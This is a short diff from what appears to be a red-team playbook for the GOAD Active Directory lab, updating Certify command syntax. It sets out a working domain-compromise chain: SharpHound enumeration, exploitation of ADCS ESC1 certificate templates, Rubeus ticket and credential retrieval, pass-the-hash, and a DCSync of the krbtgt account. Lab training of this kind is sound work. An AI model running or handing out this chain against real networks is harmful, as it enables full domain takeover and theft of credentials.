@@ -62,7 +62,7 @@ Step 1: SharpHound -c All --SearchForest --ZipFilename goad.zip
 → Ingest to BloodHound CE
 → Identify attack paths from controlled principal to Domain Admin
 
-Step 2: Certify find /vulnerable
+Step 2: Certify enum-templates --filter-vulnerable
 → Identify ADCS ESC1/ESC6/ESC8 misconfigurations
 
 Step 3: Review BloodHound paths:
@@ -74,7 +74,7 @@ Step 3: Review BloodHound paths:
 
 ```
 If ESC1 available:
-  Step 4: Certify request /ca:NORTHCA\NORTH-CA /template:VulnTemplate /altname:administrator
+  Step 4: Certify request --ca SERVER\CA-NAME --template VulnTemplate --upn USER@DOMAIN
   Step 5: Rubeus asktgt /user:administrator /certificate:<pfx> /getcredentials /show /ptt
   Step 6: Apollo pth /user:administrator /domain:NORTH /ntlm:<hash-from-step5>
   Step 7: Apollo dcsync /domain:north.sevenkingdoms.local /user:krbtgt
